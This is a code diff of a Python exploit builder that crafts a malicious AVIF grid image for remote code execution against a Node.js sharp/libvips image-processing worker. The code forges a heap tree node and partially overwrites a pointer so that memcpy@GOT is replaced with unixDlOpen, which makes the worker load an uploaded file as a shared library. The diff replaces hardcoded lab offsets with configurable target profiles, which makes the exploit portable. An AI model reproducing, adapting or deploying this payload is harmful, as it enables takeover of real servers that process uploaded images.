@@ -11,90 +11,100 @@ from __future__ import annotations
 import struct
 
 from avif_grid import build_grid_avif
+from stack_profile import NativeStackProfile, load_profile
 
 
-TILE_WIDTH = 116
-TILE_HEIGHT = 33
-CHROMA_WIDTH = (TILE_WIDTH + 1) // 2
-CHROMA_HEIGHT = (TILE_HEIGHT + 1) // 2
-CANVAS_CHROMA_HEIGHT = (TILE_HEIGHT * 4 + 1) // 2
-CANVAS_STRIDE = 64
-
-# Pinned lab build: Node v25.8.1 ET_EXEC and bundled libvips 8.17.2.
-NODE_UNIX_DLOPEN = 0x1FB95B0
-LIBVIPS_MEMCPY_GOT = 0xF83098
-
-# In the measured stock sharp worker layout the fourth tile's local chroma
-# row 1 is at low16 0x5970.  The overflow changes only the low two bytes of
-# the live pointer, retaining the remotely unknown high 48 bits.
-FAKE_NODE_LOW16 = 0x5970
-FAKE_NODE_LOCAL_ROW = 1
-
-
-def _fake_plane_node(write_target: int) -> bytes:
-    node = bytearray(96)
-    struct.pack_into("<Q", node, 16, 0)  # left: terminate map search
-    struct.pack_into("<Q", node, 24, 0)  # right: unused before GOT trigger
-    struct.pack_into("<I", node, 32, 2)  # heif_channel_Cr
-    struct.pack_into("<I", node, 40, 0)  # unsigned integer datatype
-    node[44] = 8
-    node[45] = 1
+def _fake_plane_node(write_target: int,
+                     profile: NativeStackProfile) -> bytes:
+    tree = profile.abi.rb_tree_node
+    plane = profile.abi.image_plane
+    payload = profile.payload
+    node = bytearray(tree.size)
+    struct.pack_into("<Q", node, tree.left_offset, 0)
+    struct.pack_into("<Q", node, tree.right_offset, 0)
+    struct.pack_into("<I", node, tree.key_offset, plane.cr_channel)
     struct.pack_into(
-        "<II", node, 48, CHROMA_WIDTH, CANVAS_CHROMA_HEIGHT,
+        "<I", node, plane.datatype_offset, plane.unsigned_datatype,
     )
-    struct.pack_into("<Q", node, 64, write_target)
-    struct.pack_into("<I", node, 88, 0)  # destination stride: every row same
+    node[plane.bits_per_pixel_offset] = 8
+    node[plane.components_offset] = 1
+    struct.pack_into(
+        "<II",
+        node,
+        plane.width_offset,
+        payload.chroma_width,
+        payload.canvas_chroma_height,
+    )
+    struct.pack_into("<Q", node, plane.mem_offset, write_target)
+    struct.pack_into("<I", node, plane.stride_offset, 0)
     return bytes(node)
 
 
 def build_rce_payload(libvips_base: int,
-                      library_path: str = "uploads/x.jpg") -> bytes:
+                      library_path: str | None = None,
+                      profile: NativeStackProfile | None = None) -> bytes:
     """Build one runtime-specific AVIF from the remotely leaked DSO base."""
-    encoded_path = library_path.encode("ascii") + b"\x00"
-    if len(encoded_path) > 16:
+    selected = profile or load_profile()
+    payload = selected.payload
+    remote_path = library_path or selected.application.library_path
+    encoded_path = remote_path.encode("ascii") + b"\x00"
+    if len(encoded_path) > payload.path_field_bytes:
         raise ValueError(
-            "library_path must fit in 15 ASCII bytes plus the NUL terminator",
+            "library_path exceeds the selected profile's path field",
         )
-    if libvips_base & 0xFFF:
+    if libvips_base & (selected.libvips.leak.base_alignment - 1):
         raise ValueError("libvips base is not page-aligned")
 
-    # The first chosen-address memcpy starts 16 bytes before memcpy@GOT.  Its
-    # source row contains the path followed at +16 by unixDlOpen, replacing
+    # The first chosen-address memcpy starts at the profile's backoff before
+    # memcpy@GOT. Its source row contains the path field followed by
+    # unixDlOpen, replacing
     # the GOT slot.  The next row calls the replacement with RSI pointing to
     # the same path prefix.
-    write_target = libvips_base + LIBVIPS_MEMCPY_GOT - 16
-    row = encoded_path.ljust(16, b"\x00")
-    row += struct.pack("<Q", NODE_UNIX_DLOPEN)
-    row += bytes(CHROMA_WIDTH - len(row))
-    write_data = row * CHROMA_HEIGHT
-    node = _fake_plane_node(write_target)
-    root_chunk_header = struct.pack("<QQ", 0, 0x75)
-    selected_low16 = struct.pack("<H", FAKE_NODE_LOW16)
+    write_target = (
+        libvips_base
+        + selected.libvips.memcpy_got_offset
+        - payload.write_target_backoff
+    )
+    row = encoded_path.ljust(payload.path_field_bytes, b"\x00")
+    row += struct.pack("<Q", selected.node.unix_dl_open_address)
+    row += bytes(payload.chroma_width - len(row))
+    write_data = row * payload.chroma_height
+    node = _fake_plane_node(write_target, selected)
+    root_chunk_header = struct.pack(
+        "<QQ", 0, selected.glibc.root_chunk_size_and_flags,
+    )
+    selected_low16 = payload.fake_node_low16.to_bytes(
+        payload.redirect_pointer_size, "little",
+    )
 
     def cb_value(x: int, y: int) -> int:
-        relative = (y - FAKE_NODE_LOCAL_ROW) * CANVAS_STRIDE + x
+        relative = (
+            (y - payload.fake_node_local_row) * payload.canvas_stride + x
+        )
         if 0 <= relative < len(node):
             return node[relative]
-        if y != CHROMA_HEIGHT - 1:
+        if y != payload.chroma_height - 1:
             return 0
-        if x < 16:
-            return 0
-        if x < 32:
-            return root_chunk_header[x - 16]
-        if x < 56:
-            return 0
-        return selected_low16[x - 56]
+        header_start = payload.chunk_header_offset
+        header_end = header_start + payload.chunk_header_size
+        if header_start <= x < header_end:
+            return root_chunk_header[x - header_start]
+        redirect_start = payload.redirect_pointer_offset
+        redirect_end = redirect_start + payload.redirect_pointer_size
+        if redirect_start <= x < redirect_end:
+            return selected_low16[x - redirect_start]
+        return 0
 
     def cr_value(x: int, y: int) -> int:
-        return write_data[y * CHROMA_WIDTH + x]
+        return write_data[y * payload.chroma_width + x]
 
     return build_grid_avif(
-        tile_w=TILE_WIDTH,
-        tile_h=TILE_HEIGHT,
-        rows=4,
-        cols=1,
-        canvas_w=TILE_WIDTH,
-        canvas_h=TILE_HEIGHT * 4,
+        tile_w=payload.tile_width,
+        tile_h=payload.tile_height,
+        rows=payload.grid_rows,
+        cols=payload.grid_columns,
+        canvas_w=payload.tile_width * payload.grid_columns,
+        canvas_h=payload.tile_height * payload.grid_rows,
         luma=0x80,
         cb=cb_value,
         cr=cr_value,
